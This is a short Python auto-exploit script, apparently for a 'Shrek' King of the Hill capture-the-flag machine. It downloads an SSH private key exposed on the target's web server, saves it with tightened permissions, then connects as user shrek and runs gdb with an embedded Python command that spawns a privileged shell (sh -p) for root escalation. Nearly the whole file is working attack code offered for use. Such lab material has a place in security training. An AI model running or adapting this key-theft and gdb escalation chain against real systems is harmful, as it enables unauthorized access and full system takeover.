import requests
import sys
import os

banner = """
[+]==============================[+]
|    SHREK - KING OF THE HILL    |
|    Auto Exploit Script - KOTH  |
|    Made by: Muhamad Rohan Khan |
[+]==============================[+]

Follow me on linkedin:- https://www.linkedin.com/in/muhammadrohankhan
"""
print(banner)

if "-i" not in sys.argv or len(sys.argv) < 3:
    print("[-] Usage: python3 shrek.py -i <target-ip>")
    sys.exit(1)

target_ip = sys.argv[2]
print(f"[+] Target IP: {target_ip}")

key_url = f"http://{target_ip}/Cpxtpt2hWCee9VFa.txt"
key_file = "id_rsa"

# Remove existing key file if it exists
if os.path.exists(key_file):
    print(f"[!] Found existing {key_file}, removing it to avoid conflict...")
    os.remove(key_file)

print(f"[+] Downloading SSH private key from: {key_url}")
try:
    response = requests.get(key_url)
    if "PRIVATE KEY" not in response.text:
        print("[-] Key not found or invalid content.")
        sys.exit(1)
    
    with open(key_file, "w") as file:
        file.write(response.text)
    os.chmod(key_file, 0o600)
    print(f"[+] Private key saved to {key_file} and permissions set to 600.")
except Exception as e:
    print(f"[-] Error downloading the key: {e}")
    sys.exit(1)

# Simplified SSH command
ssh_cmd = f"ssh -i {key_file} shrek@{target_ip} -t 'gdb -nx -ex \"python import os; os.execl(\\\"/bin/sh\\\", \\\"sh\\\", \\\"-p\\\")\" -ex quit'"

print("[+] Attempting to connect via SSH and escalate to root using GDB...")
os.system(ssh_cmd)
